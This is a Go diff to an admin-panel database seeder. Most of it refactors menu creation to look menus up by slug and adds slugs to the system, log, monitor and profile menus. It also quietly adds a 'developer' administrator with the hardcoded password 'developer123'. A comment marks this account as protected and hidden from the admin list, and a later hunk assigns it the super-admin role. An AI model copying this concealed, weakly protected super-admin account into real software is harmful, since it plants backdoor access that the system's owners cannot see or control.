@@ -24,6 +24,18 @@ func (s *AdminSeeder) Run() error {
 	}
 	facades.Orm().Query().FirstOrCreate(&superAdmin, models.Admin{Username: "admin"})
 
+	// 创建开发者管理员（受保护，不显示在列表中）
+	developerPassword, _ := facades.Hash().Make("developer123")
+	developerAdmin := models.Admin{
+		Username: "developer",
+		Password: developerPassword,
+		Nickname: "开发者管理员",
+		Status:   1,
+	}
+	facades.Orm().Query().FirstOrCreate(&developerAdmin, models.Admin{Username: "developer"})
+
+	// 确保开发者管理员有 super-admin 角色（需要在创建 superRole 之后）
+
 	// 创建部门
 	var rootDept models.Department
 	facades.Orm().Query().FirstOrCreate(&rootDept, models.Department{
@@ -61,17 +73,26 @@ func (s *AdminSeeder) Run() error {
 		Sort:        1,
 	})
 
-	// 辅助函数：根据Path查找或创建菜单，如果存在则更新（保留用户修改的图标）
+	// 辅助函数：根据Slug查找或创建菜单，如果存在则更新（保留用户修改的图标）
 	createOrUpdateMenu := func(menuData models.Menu) models.Menu {
+		// 如果 slug 为空，跳过（不应该发生，但作为保护）
+		if menuData.Slug == "" {
+			facades.Log().Errorf("Menu slug is empty for title: %s", menuData.Title)
+			return menuData
+		}
+
 		var existingMenu models.Menu
-		if err := facades.Orm().Query().Where("path", menuData.Path).First(&existingMenu); err == nil {
+		// 先尝试通过 slug 查找
+		if err := facades.Orm().Query().Where("slug", menuData.Slug).First(&existingMenu); err == nil {
 			// 菜单已存在，更新除图标外的其他字段（保留用户可能修改的图标）
 			existingMenu.ParentID = menuData.ParentID
 			existingMenu.Title = menuData.Title
+			existingMenu.Slug = menuData.Slug // 确保 slug 也被更新
 			// 如果现有菜单的图标为空，才更新图标；否则保留用户修改的图标
 			if existingMenu.Icon == "" {
 				existingMenu.Icon = menuData.Icon
 			}
+			existingMenu.Path = menuData.Path
 			existingMenu.Component = menuData.Component
 			existingMenu.Permission = menuData.Permission
 			existingMenu.Type = menuData.Type
@@ -79,10 +100,46 @@ func (s *AdminSeeder) Run() error {
 			existingMenu.Sort = menuData.Sort
 			existingMenu.IsHidden = menuData.IsHidden
 			facades.Orm().Query().Save(&existingMenu)
+			// 重新查询确保获取最新数据
+			facades.Orm().Query().Where("id", existingMenu.ID).First(&existingMenu)
 			return existingMenu
 		}
+
+		// 如果通过 slug 找不到，尝试通过 path 和 title 查找（兼容旧数据，可能 slug 为空）
+		if menuData.Path != "" {
+			var existingByPath models.Menu
+			if err := facades.Orm().Query().Where("path", menuData.Path).Where("title", menuData.Title).First(&existingByPath); err == nil {
+				// 找到旧菜单（可能 slug 为空），更新它
+				existingByPath.ParentID = menuData.ParentID
+				existingByPath.Title = menuData.Title
+				existingByPath.Slug = menuData.Slug // 更新 slug
+				if existingByPath.Icon == "" {
+					existingByPath.Icon = menuData.Icon
+				}
+				existingByPath.Path = menuData.Path
+				existingByPath.Component = menuData.Component
+				existingByPath.Permission = menuData.Permission
+				existingByPath.Type = menuData.Type
+				existingByPath.Status = menuData.Status
+				existingByPath.Sort = menuData.Sort
+				existingByPath.IsHidden = menuData.IsHidden
+				facades.Orm().Query().Save(&existingByPath)
+				// 重新查询确保获取最新数据
+				facades.Orm().Query().Where("id", existingByPath.ID).First(&existingByPath)
+				return existingByPath
+			}
+		}
+
 		// 菜单不存在，创建新菜单
-		facades.Orm().Query().Create(&menuData)
+		if err := facades.Orm().Query().Create(&menuData); err != nil {
+			facades.Log().Errorf("Failed to create menu with slug %s: %v", menuData.Slug, err)
+			return menuData
+		}
+		// 创建后重新查询获取完整的菜单信息（包括ID）
+		var createdMenu models.Menu
+		if err := facades.Orm().Query().Where("slug", menuData.Slug).First(&createdMenu); err == nil {
+			return createdMenu
+		}
 		return menuData
 	}
 
@@ -91,6 +148,7 @@ func (s *AdminSeeder) Run() error {
 	systemMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  0,
 		Title:     "系统管理",
+		Slug:      "system",
 		Icon:      "Setting",
 		Path:      "/system",
 		Component: "Layout",
@@ -103,6 +161,7 @@ func (s *AdminSeeder) Run() error {
 	adminMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  systemMenu.ID,
 		Title:     "管理员管理",
+		Slug:      "admin",
 		Icon:      "User",
 		Path:      "/system/admin",
 		Component: "system/admin/index",
@@ -115,6 +174,7 @@ func (s *AdminSeeder) Run() error {
 	roleMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  systemMenu.ID,
 		Title:     "角色管理",
+		Slug:      "role",
 		Icon:      "UserFilled",
 		Path:      "/system/role",
 		Component: "system/role/index",
@@ -127,6 +187,7 @@ func (s *AdminSeeder) Run() error {
 	permissionMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  systemMenu.ID,
 		Title:     "权限管理",
+		Slug:      "permission",
 		Icon:      "Lock",
 		Path:      "/permissions",
 		Component: "permission/index",
@@ -139,6 +200,7 @@ func (s *AdminSeeder) Run() error {
 	menuMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  systemMenu.ID,
 		Title:     "菜单管理",
+		Slug:      "menu",
 		Icon:      "Menu",
 		Path:      "/menus",
 		Component: "menu/index",
@@ -151,6 +213,7 @@ func (s *AdminSeeder) Run() error {
 	departmentMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  systemMenu.ID,
 		Title:     "部门管理",
+		Slug:      "department",
 		Icon:      "OfficeBuilding",
 		Path:      "/departments",
 		Component: "department/index",
@@ -163,6 +226,7 @@ func (s *AdminSeeder) Run() error {
 	dictionaryMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  systemMenu.ID,
 		Title:     "字典管理",
+		Slug:      "dictionary",
 		Icon:      "Document",
 		Path:      "/dictionaries",
 		Component: "dictionary/index",
@@ -176,6 +240,7 @@ func (s *AdminSeeder) Run() error {
 	logMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  0,
 		Title:     "日志管理",
+		Slug:      "log",
 		Icon:      "Document",
 		Path:      "/logs",
 		Component: "Layout",
@@ -189,6 +254,7 @@ func (s *AdminSeeder) Run() error {
 	operationLogMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  logMenu.ID,
 		Title:     "操作日志",
+		Slug:      "operation-log",
 		Icon:      "Document",
 		Path:      "/operation-logs",
 		Component: "log/operation/index",
@@ -201,6 +267,7 @@ func (s *AdminSeeder) Run() error {
 	loginLogMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  logMenu.ID,
 		Title:     "登录日志",
+		Slug:      "login-log",
 		Icon:      "Document",
 		Path:      "/login-logs",
 		Component: "log/login/index",
@@ -213,6 +280,7 @@ func (s *AdminSeeder) Run() error {
 	systemLogMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  logMenu.ID,
 		Title:     "系统日志",
+		Slug:      "system-log",
 		Icon:      "Document",
 		Path:      "/system-logs",
 		Component: "log/system/index",
@@ -226,6 +294,7 @@ func (s *AdminSeeder) Run() error {
 	monitorMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  0,
 		Title:     "服务监控",
+		Slug:      "monitor",
 		Icon:      "Monitor",
 		Path:      "/monitor",
 		Component: "monitor/index",
@@ -239,6 +308,7 @@ func (s *AdminSeeder) Run() error {
 	profileMenu := createOrUpdateMenu(models.Menu{
 		ParentID:  0,
 		Title:     "个人中心",
+		Slug:      "profile",
 		Icon:      "User",
 		Path:      "/profile",
 		Component: "profile/index",
@@ -358,6 +428,9 @@ func (s *AdminSeeder) Run() error {
 
 	// 关联超级管理员和超级角色
 	facades.Orm().Query().Model(&superAdmin).Association("Roles").Replace([]models.Role{superRole})
+
+	// 给开发者管理员分配 super-admin 角色
+	facades.Orm().Query().Model(&developerAdmin).Association("Roles").Replace([]models.Role{superRole})
 
 	// 关联超级角色和所有权限
 	var allPerms []models.Permission
